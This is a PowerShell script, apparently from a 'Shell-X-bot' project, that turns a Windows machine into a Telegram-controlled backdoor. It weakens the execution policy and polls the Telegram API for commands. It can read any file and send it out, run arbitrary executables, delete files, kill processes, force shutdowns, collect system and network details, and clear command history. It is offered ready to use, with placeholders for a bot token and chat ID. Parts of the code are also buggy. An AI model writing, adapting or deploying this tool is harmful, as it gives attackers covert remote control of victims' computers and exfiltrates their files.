# Check current execution policy and adjust if necessary
$currentPolicy = Get-ExecutionPolicy
if ($currentPolicy -eq 'Restricted' -or $currentPolicy -eq 'AllSigned') {
    Write-Host "Current execution policy is '$currentPolicy'. Temporarily setting it to 'RemoteSigned' for this session."
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force
}
# Rest of your script goes here...

# Set bot token and chat ID
$botToken = "Enter Your Bot Token"
$chatID = "Enter Your Chat ID"
$lastUpdateId = 0

# Required PowerShell modules
Import-Module Microsoft.PowerShell.Security
Import-Module Microsoft.PowerShell.Utility
Import-Module NetworkConnectivityStatus
Import-Module NetworkSwitchManager


# Function to send a message to Telegram
function Send-TelegramMessage($message) {
    $url = "https://api.telegram.org/bot$($botToken)/sendMessage"
    $body = @{
        chat_id = $chatID
        text    = $message
    }
    Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded'
}

# Function to get updates (commands) from Telegram
function Get-TelegramUpdates($offset) {
    $url = "https://api.telegram.org/bot$($botToken)/getUpdates?offset=$($offset)"
    $updates = Invoke-RestMethod -Uri $url -Method Get
    return $updates.result
}

# Function to send a welcome message
function Send-WelcomeMessage {
    $welcomeMessage = "*Welcome to the Telegram Bot!* Here are the available commands:`n`n" +
                      "/start - Show this welcome message.`n" +
                      "/createfile <file_path> <content> - Create a file with specified content.`n" +
                      "/removefile <file_path> - Remove the specified file.`n" +
                      "/listfiles <directory_path> - List all files in the specified directory.`n" +
                      "/logoff - Log off current user.`n" +
                      "/showmessage <content> - Show Custom Message in a Dialog.`n" +
                      "/lockcomputer - Lock Computer.`n" +
                      "/shutdown - Shutdown the computer or set time in seconds.`n" +
                      "/restart - Restart the computer.`n" +
                      "/sysinfo - Get system information.`n" +
                      "/getcurrentdir - Get current directory.`n" +
                      "/gethardwareinfo - Get Hardware Info.`n" +
                      "/gethistory - Get CMD or PowerShell Command History.`n" +
                      "/clearhistory - Clear all history of cmd or powershell.`n" +
                      "/getsystemstatus - Get system status (battery, CPU, RAM, network).`n" +
                      "/getip - Get your IP address.`n" +
                      "/getdevices - Get all connected hardware information.`n" +
                      "/getopenedapplications - Get opened applications.`n" +
                      "/getuptime - Get system (CPU) uptime.`n" +
                      "/getstoragedetails - Get all connected storage information.`n" +
                      "/getfilecontent <file_path> - Get content of the specified file.`n" +
                      "/runfile <file_path> - Run any file by specifying the file path.`n" +
                      "/killprocess <process_id> | <application_name> - Kill a running process by ID or name.`n" +
                      "/getHardwaredevices - Get All Hardware Device info.`n" +
                      "/runprocess <exe_path> [optional_args path] - Run a process or only executable file.`n" +
                     "/help - If you're facing any issues with the command, you can refer to the GitHub repository link for help.`n"

    Send-TelegramMessage -message $welcomeMessage
}
# Function to handle commands
function Process-Command($command) {
    $parts = $command -split " "

    switch ($parts[0]) {
        "/start" {
            Send-WelcomeMessage
        }
        #Create File
        "/createfile" {
            $filePath = $parts[1]
            $content = $parts[2..($parts.Length - 1)] -join " "
            New-Item -Path $filePath -ItemType File -Force
            Set-Content -Path $filePath -Value $content
            Send-TelegramMessage -message "File created at $filePath with content."
        }
        # Remove File
        "/removefile" {
            $filePath = $parts[1]
            if (Test-Path $filePath) {
                Remove-Item $filePath -Force
                Send-TelegramMessage -message "File removed at $filePath."
            } else {
                Send-TelegramMessage -message "File does not exist."
            }
        }
        # See All Files On A Path or current Directory
        "/listfiles" {
            $dirPath = $parts[1]
            $files = Get-ChildItem -Path $dirPath | ForEach-Object { $_.Name }
            Send-TelegramMessage -message "Files: $($files -join ', ')"
        }		
		#log off current user 
		"/logoff" {
            $logoffCommand = "shutdown.exe /l"
            try {
               Invoke-Expression $logoffCommand
               Send-TelegramMessage -message "The current user is being logged off."
                } catch {
                    Send-TelegramMessage -message "Failed to log off the current user. Error: $_"
                        }
                }
        # Show Custom Message in a Dialog
		"/showmessage" {
            $customMessage = $parts[1..($parts.Length - 1)] -join " "
            Add-Type -AssemblyName PresentationFramework
            [System.Windows.MessageBox]::Show($customMessage, "Warning")
            Send-TelegramMessage -message "Displayed message: $customMessage"
        }
		#lock Computer 
		"/lockcomputer" {
            rundll32.exe user32.dll, LockWorkStation
            Send-TelegramMessage -message "The computer has been locked."
        }
        # Shutdown Computer
        "/shutdown" {
            if ($parts.Length -gt 1) {
                $delay = $parts[1]
                Start-Sleep -Seconds $delay
                Send-TelegramMessage -message "Shutting down the computer in $delay seconds."
            } else {
                Send-TelegramMessage -message "Shutting down the computer immediately."
            }
            Stop-Computer -Force
        }
        #  Restart the computer
        "/restart" {
            Restart-Computer -Force -Confirm:$false
            Send-TelegramMessage -message "The computer is restarting."
        }
        # Computer Info
        "/sysinfo" {
            $sysInfo = Get-ComputerInfo
            Send-TelegramMessage -message "System Info: OS: $($sysInfo.WindowsVersion), Build: $($sysInfo.OSBuildNumber)"
        }
        # Know current Directory
        "/getcurrentdir" {
            $currentDir = Get-Location
            Send-TelegramMessage -message "Current Directory: $currentDir"
        }
        # Get Hardware Info
        "/gethardwareinfo" {
            $hardwareInfo = Get-CimInstance -ClassName Win32_ComputerSystem
            Send-TelegramMessage -message "Hardware Info: Manufacturer: $($hardwareInfo.Manufacturer), Model: $($hardwareInfo.Model)"
        }
        # Get CMD or PowerShell Command History
        "/gethistory" {
            $history = Get-History
            $formattedHistory = $history | ForEach-Object { "$($_.Id): $($_.CommandLine)" }
            Send-TelegramMessage -message "Command History: $($formattedHistory -join ', ')"
        }
        # Clear all History of CMD or PowerShell
        "/clearhistory" {
            Clear-History
            Send-TelegramMessage -message "History cleared."
        }
        # Get System Info
        "/getsystemstatus" {
            $battery = Get-WmiObject Win32_Battery
            $network = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
            $cpuUsage = Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average
            $ramUsage = Get-WmiObject Win32_OperatingSystem | Select-Object FreePhysicalMemory, TotalVisibleMemorySize
            $statusMessage = "Battery Level: $($battery.EstimatedChargeRemaining)%, CPU Usage: $($cpuUsage.Average)%, " +
                             "RAM Usage: $([math]::round((($ramUsage.TotalVisibleMemorySize - $ramUsage.FreePhysicalMemory) / $ramUsage.TotalVisibleMemorySize) * 100, 2))%, " +
                             "Network: $($network.Name), SSID: $($network.Ssid)"

            Send-TelegramMessage -message $statusMessage
        }


        "/getip" {
            $ipAddress = (Invoke-RestMethod -Uri "http://api.ipify.org") # Get external IP
            Send-TelegramMessage -message "Your IP Address: $ipAddress"
        }
        # Get Device info
        "/getdevices" {
            $devices = Get-PnpDevice | Where-Object { 
                $_.FriendlyName -like "*Keyboard*" -or 
                $_.FriendlyName -like "*Mouse*" -or 
                $_.FriendlyName -like "*USB*"
            }
            $deviceInfo = "Connected Devices:`n"
            foreach ($device in $devices) {
                $deviceInfo += "Name: $($device.Name)`n"
                $deviceInfo += "ID: $($device.InstanceId)`n"
                $deviceInfo += "Class: $($device.Class)`n"
                $deviceInfo += "------------------------------------`n"
            }
            if ($devices.Count -eq 0) {
                $deviceInfo += "No hardware devices found matching Keyboard, Mouse, or USB.`n"
            }
            $connectedDevices = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -Property Name, MacAddress
            $deviceDetails = $connectedDevices | ForEach-Object { "$($_.Name) - MAC: $($_.MacAddress)" }
            if ($deviceDetails.Count -gt 0) {
                $deviceInfo += "`nConnected Network Adapters:`n"
                $deviceInfo += ($deviceDetails -join "`n")
            } else {
                $deviceInfo += "`nNo network adapters found."
            }
            Send-TelegramMessage -message $deviceInfo
        }
        # Get Opened Application
        "/getopenedapplications" {
            $openedApps = Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -Property Name
            Send-TelegramMessage -message "Opened Applications: $($openedApps.Name -join ', ')"
        }
        # Get Up time of CPU
        "/getuptime" {
            $uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
            Send-TelegramMessage -message "System Uptime: $([math]::round($uptime.TotalDays, 2)) days."
        }
        # Get Storage Info
        "/getstoragedetails" {
            $storageDetails = Get-PSDrive -PSProvider FileSystem | Select-Object -Property Name, @{Name='Used (GB)'; Expression={[math]::round($_.Used/1GB, 2)}}, 
                                                                @{Name='Free (GB)'; Expression={[math]::round($_.Free/1GB, 2)}}, 
                                                                @{Name='Total (GB)'; Expression={[math]::round($_.Used/1GB, 2) + [math]::round($_.Free/1GB, 2)}}, 
                                                                @{Name='Drive Label'; Expression={ (Get-Volume -DriveLetter $_.Name).FileSystemLabel }}
            $storageInfo = "Storage Details:`n"
            foreach ($storage in $storageDetails) {
                $storageInfo += "Drive: $($storage.Name)`n"
                $storageInfo += "Label: $($storage.'Drive Label')`n"
                $storageInfo += "Used: $($storage.'Used (GB)') GB`n"
                $storageInfo += "Free: $($storage.'Free (GB)') GB`n"
                $storageInfo += "Total: $($storage.'Total (GB)') GB`n"
                $storageInfo += "----------------------------------`n"
            }
            Send-TelegramMessage -message $storageInfo
        }
        # Get File Content
        "/getfilecontent" {
            $filePath = $parts[1]
            if (Test-Path $filePath) {
                $fileContent = Get-Content -Path $filePath -Raw
                Send-TelegramMessage -message 'Content of ' + $filePath + ':`n' + $fileContent
            } else {
                Send-TelegramMessage -message "File does not exist."
            }
        }
        # Run Any File
        "/runfile" {
            if ($parts.Length -gt 1) {
                $filePath = $parts[1..($parts.Length - 1)] -join " "
                
                # Check if the file exists
                if (Test-Path -Path $filePath) {
                    # Start the process for the file using 'explorer' to open by default app
                    Start-Process -FilePath "explorer.exe" -ArgumentList $filePath
                    Send-TelegramMessage -message "File '$filePath' is being executed."  # Notify via Telegram
                } else {
                    Send-TelegramMessage -message "File does not exist at '$filePath'."  # Notify if the file does not exist
                }
            } else {
                Send-TelegramMessage -message "No file path provided."  # Notify if no path is given
            }
        }
        # Kill proess with name or Process-ID
        "/killprocess" {
            if ($parts.Length -ge 2) {
                $processIdentifier = $parts[1]
                try {
                    if ([int]::TryParse($processIdentifier, [ref]$null)) {
                        Stop-Process -Id $processIdentifier -Force
                        Send-TelegramMessage -message "Process with ID '$processIdentifier' has been terminated."
                    } else {
                        Stop-Process -Name $processIdentifier -Force -ErrorAction Stop
                        Send-TelegramMessage -message "Process '$processIdentifier' has been terminated."  # Notify via Telegram
                    }
                } catch {
                    Send-TelegramMessage -message "Error: Unable to terminate process '$processIdentifier'. It may not be running."  # Notify if an error occurs
                }
            } else {
                Send-TelegramMessage -message "Usage: /killprocess <processNameOrID>"  # Notify if the command format is incorrect
            }
        }
        # Get Hardware Device Info  
        "/getHardwaredevices" {
            $devices = Get-PnpDevice | Where-Object { 
                $_.FriendlyName -like "*Keyboard*" -or 
                $_.FriendlyName -like "*Mouse*" -or 
                $_.FriendlyName -like "*USB*"
            }
            $deviceInfo = "Connected Devices:`n"
            foreach ($device in $devices) {
                $deviceInfo += "Name: $($device.Name)`n"
                $deviceInfo += "ID: $($device.InstanceId)`n"
                $deviceInfo += "Class: $($device.Class)`n"
                $deviceInfo += "------------------------------------`n"
            }
            if ($devices.Count -eq 0) {
                $deviceInfo = "No devices found matching Keyboard, Mouse, or USB."
            }
            Send-TelegramMessage -message $deviceInfo
        }
        # Run Process or file 
        "/runprocess" {
            if ($parts.Length -gt 1) {
                $exePath = $parts[1]
                if (Test-Path $exePath) {
                    $arguments = if ($parts.Length -gt 2) { $parts[2..($parts.Length - 1)] -join " " } else { $null }
                    if ($arguments) {
                        Start-Process -FilePath $exePath -ArgumentList $arguments
                        Send-TelegramMessage -message "Running $exePath with arguments: $arguments"
                    } else {
                        Start-Process -FilePath $exePath
                        Send-TelegramMessage -message "Running $exePath."
                    }
                } else {
                    Send-TelegramMessage -message "Executable file does not exist: $exePath"
                }
            } else {
                Send-TelegramMessage -message "Usage: /runprocess <executablePath> [<arguments>]"
            }
        }
        #Help Section
        "/help" {
            $defaultLinks = "https://github.com/hackresist/Shell-X-bot "
            Send-TelegramMessage -message "Here are the links: $defaultLinks"
        }		
        # Default Message 
        default {
            Send-TelegramMessage -message "Unknown command. Type /start to see available commands."
        }
    }
}

# Main loop to listen for commands
while ($true) {
    $updates = Get-TelegramUpdates $lastUpdateId
    foreach ($update in $updates) {
        $lastUpdateId = $update.update_id + 1  # Increment to the next update ID
        if ($update.message -and $update.message.text) {
            Process-Command $update.message.text
        }
    }
    Start-Sleep -Seconds 2
}
